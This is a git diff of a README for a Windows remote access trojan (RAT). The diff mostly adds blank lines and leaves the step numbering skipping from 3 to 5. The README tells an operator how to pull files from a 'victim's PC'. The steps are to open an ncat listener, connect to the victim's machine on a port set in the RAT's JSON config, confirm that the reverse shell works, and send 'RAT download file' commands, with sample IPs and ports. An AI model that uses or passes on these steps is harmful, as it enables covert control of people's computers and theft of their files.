@@ -9,12 +9,18 @@ Developed for Windows.
 2. Is able to download any files from victim's PC on specified port (provided in JSON file), no need for server setup or anything, only netcat on your side and launched RAT on victim's side :)
 #### How to download files:
 1. Put netcat on listening state (ncat -v -l -p "port for file download from JSON" > "file name with extension that you want to download")
+
 Example: ncat -v -l -p 8889 > helloworld2.exe
+
 NOTE: I advice you to use "-v" for more verbose output
+
 2. Connect to victim PC through netcat (ncat <ip addrress> <port from JSON configuration on which RAT will be listening>)
+
 Example: ncat 192.168.88.220 8888
+
 3. Check if reverse shell is working (cd, dir)
-4. Currently RAT has it's own command interpreter which will listen to commands from your PC, these type of commands begin with "RAT".
+
+5. Currently RAT has it's own command interpreter which will listen to commands from your PC, these type of commands begin with "RAT".
 
 For file download command is - "RAT download file -p <windows/path/to/file/withextension>"
   
